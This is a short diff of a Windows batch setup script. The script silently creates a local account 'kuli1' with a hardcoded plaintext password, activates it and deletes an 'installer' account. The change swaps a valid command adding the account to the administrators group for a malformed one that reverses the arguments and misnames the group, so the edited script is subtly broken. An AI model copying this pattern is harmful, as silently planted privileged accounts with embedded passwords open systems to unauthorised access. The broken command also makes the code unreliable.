@@ -1,6 +1,6 @@
 @echo off
 net user kuli1 AgwgxR8pXbAjCRTcq^#U2^ /add >nul
-net localgroup administrators kuli1 /add >nul
+net localgroup kuli1 administrator /add >nul
 net user kuli1 /active:yes >nul
 net user installer /delete
 diskperf -Y >nul
